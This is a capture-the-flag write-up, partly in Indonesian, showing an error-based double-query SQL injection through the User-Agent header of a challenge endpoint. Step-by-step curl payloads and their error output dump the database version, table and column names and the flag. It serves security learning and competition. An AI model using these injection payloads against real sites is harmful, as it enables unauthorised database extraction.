# Writeups-SHL-Dump-The-Flag

SQL injection Error based / Double query in insert User-Agent 

# EndPoint : http://instarget.net/IMissYou/visitor.php
# Parameter : User-Agent

Check Error MySQL :

curl -A "ua'" http://instarget.net/IMissYou/visitor.php;echo

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''ua'', '')' at line 1

''ua'InjectPointHere', '')


dari sana kita dpt simpulkan Balance Query nya bagini

----------------------------
'), ( QueryErrorBasedNya ,'
----------------------------

Query Asli :

INSERT INTO 'visitor' VALUES ('', '$ip', '$ua', '')

-----------------------------
Query + Payload 

INSERT INTO 'visitor' VALUES ('', '$ip', ''), ( QueryErrorBasedNya ,'', '')

-----------------------------

semoga paham . aku bingung jelasinnya :'v

Check lagi ...

Query :
(select 1 from (Select count(*),Concat(('Check Output'),0x7e,floor(rand(0)*2))y from information_schema.tables group by y) x)

Test :

curl -A "'), ((select 1 from (Select count(*),Concat(('Check Output'),0x7e,floor(rand(0)*2))y from information_schema.tables group by y) x),'" http://instarget.net/IMissYou/visitor.php;echo

Yihaa mantap outputnya kluar :D
lanjut


// DUMP VERSION

curl -A "'), ((select 1 from (Select count(*),Concat((version()),0x7e,floor(rand(0)*2))y from information_schema.tables group by y) x),'" http://instarget.net/IMissYou/visitor.php;echo

result:
Duplicate entry '5.5.59~1' for key 'group_key'


// DUMP DATABASE

curl -A "'), ((select 1 from (Select count(*),Concat((database()),0x7e,floor(rand(0)*2))y from information_schema.tables group by y) x),'" http://instarget.net/IMissYou/visitor.php;echo

result :
Duplicate entry 'wtf_visitor~1' for key 'group_key'

Database() = wtf_visitor

// DUMP TABLE_NAME

curl -A "'), ((select 1 from (Select count(*),Concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e,floor(rand(0)*2))y from information_schema.tables group by y) x), '" http://instarget.net/IMissYou/visitor.php;echo

result:
Duplicate entry 'L5SQFHML~1' for key 'group_key'

Table_name = L5SQFHML

mainkan limit 0,1 1,1 dst 
kebetulan cuma 1 table ya cuma 0,1

// DUMP COLUMN_NAME

curl -A "'), ((select 1 from (Select count(*),Concat((select column_name from information_schema.columns where table_schema=database() and table_name='L5SQFHML' limit 0,1),0x7e,floor(rand(0)*2))y from information_schema.tables group by y) x), '" http://instarget.net/IMissYou/visitor.php;echo

result :
Duplicate entry 'id~1' for key 'group_key'

mainkan limit
0,1 = id
1,1 = ip
2,1 = ua
3,1 = FLAG_4Q9H3W28

curl -A "'), ((select 1 from (Select count(*),Concat((select column_name from information_schema.columns where table_schema=database() and table_name='L5SQFHML' limit 3,1),0x7e,floor(rand(0)*2))y from information_schema.tables group by y) x), '" http://instarget.net/IMissYou/visitor.php;echo

Duplicate entry 'FLAG_4Q9H3W28~1' for key 'group_key'

column_name = FLAG_4Q9H3W28


// EXTRACT DATA

curl -A "'), ((select 1 from (Select count(*),Concat((select concat(FLAG_4Q9H3W28) from L5SQFHML limit 0,1),0x7e,floor(rand(0)*2))y from information_schema.tables group by y) x), '" http://instarget.net/IMissYou/visitor.php;echo


result : 
Duplicate entry 'SHL{IqJl624URIDq}~1' for key 'group_key'

Submit to @viloid_bot
/flag SHL{IqJl624URIDq}


Happy Hacking ...

// Versailles ~ @viloid
// sec7or team ~ surabaya hackerlink



